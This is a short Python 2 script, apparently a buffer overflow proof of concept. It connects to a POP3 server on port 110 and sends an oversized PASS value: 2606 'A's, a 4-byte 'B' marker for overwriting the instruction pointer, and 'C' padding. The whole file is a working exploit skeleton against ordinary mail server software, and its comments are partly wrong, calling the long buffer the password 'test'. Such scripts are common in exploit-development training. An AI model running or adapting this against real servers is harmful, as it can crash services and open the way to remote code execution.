#!/usr/bin/python
import socket



buffer = "A"*2606 + "B"*4 + "C"*(3500-2606-4)

try:
    print "\nExploit"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect(('a.b.c.d',110)) 
    data = s.recv(1024)
    print data

    s.send('USER test' +'\r\n') # send username "test"
    data = s.recv(1024) # receive reply
    print data # print reply

    s.send('PASS ' + buffer + '\r\n') # send password "test"
    data = s.recv(1024) # receive reply
    print data # print reply

    s.send('QUIT' +'\r\n') # send username "test"
    data = s.recv(1024) # receive reply
    print data # print reply

    s.close() # close socket
    print "\nDone!"

except:
    print "\nSomething Happen!"